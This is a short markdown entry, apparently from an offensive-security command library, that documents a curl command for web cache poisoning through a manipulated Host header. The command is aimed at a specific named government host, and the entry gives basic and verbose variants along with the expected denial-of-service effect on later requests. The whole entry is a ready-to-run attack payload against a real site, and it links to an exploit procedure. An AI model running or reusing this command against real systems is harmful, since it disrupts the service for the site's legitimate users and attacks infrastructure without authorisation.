---
data: >-
  curl https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host:
  acquisition-uat.gsa.gov:8888"
tags:
  - web-cache-poisoning
  - host-header
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 0f7b23df-fd45-4cec-b62c-d19f0dd06823
created_at: '2025-12-13T09:00:34.074Z'
updated_at: '2025-12-13T09:00:34.074Z'
verified: false
validated: true
submitted: true
---
# curl Poison Cache Host Header

## Command

```bash
curl https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host: acquisition-uat.gsa.gov:8888"
```

## Description

This command uses curl to send an HTTP request to the target URL with a modified Host header, poisoning the web cache by including an invalid port, which leads to DoS on subsequent requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `https://acquisition-uat.gsa.gov/\?letme\=4447` | The target URL with query parameter for cache poisoning | Yes |
| `-H "Host: acquisition-uat.gsa.gov:8888"` | Sets the Host header to include an invalid port, tricking the cache | Yes |

## Examples

### Basic Usage

```bash
curl https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host: acquisition-uat.gsa.gov:8888"
```

### Advanced Usage

```bash
curl -v https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host: acquisition-uat.gsa.gov:8888" -H "User-Agent: Custom"
```

## Expected Output

The command should return the server's response, indicating successful caching of the poisoned content, though the DoS effect is observed in subsequent requests.

## Related

- [[procedures/Exploit-Web-Cache-Poisoning-for-DoS]]
- [[tools/curl]]
